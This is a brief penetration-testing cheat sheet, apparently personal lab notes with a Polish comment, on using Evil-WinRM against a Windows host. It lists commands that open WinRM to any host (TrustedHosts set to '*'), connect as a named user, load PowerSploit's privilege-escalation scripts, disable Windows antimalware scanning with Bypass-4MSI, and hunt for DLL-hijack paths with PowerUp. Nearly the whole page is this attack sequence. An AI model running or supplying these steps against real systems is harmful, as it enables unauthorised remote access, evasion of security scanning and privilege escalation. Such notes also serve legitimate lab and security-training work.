---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Evil-WinRM

**Windows**

```
winrm quickconfig
winrm set winrm/config/client @{TrustedHosts="*"}
winrm get winrm/config/client
Enable-PSRemoting -Force _SkipNetworkProfileCheck
```

**Kali**

```
evil-winrm -i 10.20.10.5 -u "jessicar"
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd tools/PowerSploit
evil-winrm -i 10.20.10.5 -u "jessicar" -s /home/kali/tools/PowerSploit/Privesc
menu
Bypass-4MSI
menu
PowerUp.ps1
menu

#wybieramy z menu np
Find-PathDLLHijack
```
